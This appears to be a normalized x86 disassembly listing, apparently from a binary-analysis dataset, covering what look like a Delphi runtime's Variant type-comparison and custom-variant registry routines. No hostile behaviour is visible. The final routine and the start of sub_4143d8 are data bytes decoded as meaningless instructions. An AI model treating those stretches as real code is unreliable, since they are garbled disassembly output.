mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f0fc
sub_4134d8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f0fc
sub_41353c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4041b8
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0fc
sub_413568
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404a40
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0fc
sub_4135a0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405b1c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0fc
sub_4135cc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405b1c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f0fc
sub_4135f8
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e9dc
mov bx 0x8
jmp r-xdata
sub_41361c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4136df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f4a0
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413ed0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136e6
lea eax [ ebp - 0x11 ]
call sub_40f178
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4136b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f4a0
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_413ed0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40f178
retn
sub_413704
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40ea30
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40ea30
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40ea30
jmp r-xdata
je r-xdata
call sub_40e9dc
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_413800
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_41383c
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413864
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_41388c
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4138b8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_413913
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_412490
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412490
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4080e0
xor edx edx
call sub_4137ec
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41391a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
sub_413924
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_4135f8
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_4135f8
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40e9dc
mov al 0x1
jmp [ edx * 4 + jump_table_413975 ]
call sub_40e9dc
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_4136f0
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_413704
jmp r-xdata
mov eax edi
call sub_40fb30
push eax
mov eax esi
call sub_40fb30
pop edx
call sub_4137ec
jmp r-xdata
mov eax esi
call sub_4105f4
push edx
push eax
mov eax edi
call sub_4105f4
push edx
push eax
call sub_413800
jmp r-xdata
mov eax esi
call sub_411104
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411104
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_41383c
jmp r-xdata
mov eax esi
call sub_411874
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411874
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413864
jmp r-xdata
mov eax esi
call sub_411ddc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_411ddc
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_41388c
jmp r-xdata
mov edx edi
mov eax esi
call sub_4138b8
jmp r-xdata
mov eax edi
call sub_410bf0
and eax 0x7f
push eax
mov eax esi
call sub_410bf0
and eax 0x7f
pop edx
call sub_4137ec
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_41361c
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_413ab0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_4136f0
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_4136f0
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_41468c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_413704
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_41468c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_413704
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40e9dc
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e9dc
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413c49
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f76c
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_41468c
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413ddb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f76c
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413d39
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f76c
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413924
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f178
retn
call sub_40e8ec
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413bbb
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f76c
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e9dc
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413924
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f178
retn
call sub_40e8ec
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f178
retn
call sub_40e8ec
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f178
retn
call sub_40e8ec
call sub_40e9dc
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413e91
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f76c
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f178
retn
call sub_40e8ec
sub_413ed0
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413ed0
jmp r-xdata
call sub_413924
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413ed0
jmp r-xdata
pop edi
pop esi
retn
call sub_413ab0
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_413924
jmp r-xdata
sub_4140bc
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4141e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_4041b8
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_4041b8
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41468c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4041b8
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404470
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408464
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404470
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4032b8
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402884
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4043c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141e9
lea eax [ ebp - 0x208 ]
call sub_404164
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404470
sub_414240
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_414230
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_41468c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_4142b4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_414230
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_414230
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414834
sete al
xor eax eax
jmp r-xdata
sub_414350
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_414350
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_41439c
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_414350
pop ecx
pop edx
retn
sub_4143d8
[ eax + 0x80040e3 ]
push esi
popad
jb r-xdata
idiv dh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_41468c
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_41460c
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4143e8
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414449
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_405284
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414450
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403368
sub_414498
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_41460c
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_41468c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4144ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414524
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_41460c
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414560
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40371c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4145c3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145ca
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_414664
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40341c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41468c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414734
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405284
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_414744
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41481a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4147fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_40528c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414804
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4032b8
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4043c8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_408184
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_414844
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4148b3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148ba
retn
call sub_4143e8
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_40544c
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_40f18c
sub_4148bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41495d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414964
retn
mov eax rw-data
call sub_414344
mov eax sub_40ee8c
mov [ rw-data ] eax
mov eax sub_40e9dc
mov [ rw-data ] eax
mov edx sub_40e8ec
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f18c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413f38
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f4a0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412490
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412bb8
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_414968
inc esi
dec eax
add [ esi + 0x640000ff ] ch
inc esi
dec eax
add [ edi + 0x640000ff ] ch
inc esi
dec eax
add [ eax + 0x640000ff ] dl
inc esi
dec eax
add [ ecx + 0x640000ff ] dl
inc esi
dec eax
add [ edx + 0x640000ff ] dl
inc esi
dec eax
add [ ebx + 0x640000ff ] dl
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] dl
dec eax
add [ ebp + 0x640000ff ] dl
inc esi
dec eax
add [ esi + 0x640000ff ] dl
inc esi
dec eax
add [ edi + 0x640000ff ] dl
inc esi
dec eax
add [ eax + 0x640000ff ] bl
inc esi
dec eax
add [ ecx + 0x640000ff ] bl
inc esi
dec eax
add [ edx + 0x640000ff ] bl
inc esi
dec eax
add [ ebx + 0x640000ff ] bl
inc esi
dec eax
